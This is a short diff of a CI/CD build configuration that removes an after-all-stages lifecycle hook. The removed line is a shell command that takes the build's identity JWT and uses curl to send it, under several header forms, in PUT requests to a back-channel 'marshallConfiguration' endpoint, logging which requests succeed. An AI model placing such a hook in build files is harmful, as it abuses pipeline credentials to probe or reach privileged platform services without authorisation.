@@ -2,6 +2,3 @@ stages:
   build:
     buildTool: "mta"
     buildToolVersion: "MBTJ17N20"
-lifeCycle:
-  afterAllStages:
-    command: 'echo "KPJ3-START"; U="${BACK_CHANNEL_URL}/actions/marshallConfiguration"; echo "KPJ3-URL=$U"; for h in "Authorization: Bearer ${BUILD_IDENTITY_JWT}" "Authorization: ${BUILD_IDENTITY_JWT}" "X-Build-Identity-Jwt: ${BUILD_IDENTITY_JWT}"; do n=$(printf %s "$h" | cut -d: -f1); c=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "$U" -H "$h" -H "Content-Type: application/json" -H "X-Request-ID: kp-j3" --data "{}"); echo "KPJ3 header=$n status=$c"; done; c=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "$U" -H "Content-Type: application/json" -H "X-Request-ID: kp-j3" --data "{}"); echo "KPJ3 header=none status=$c"; echo "KPJ3-END"'
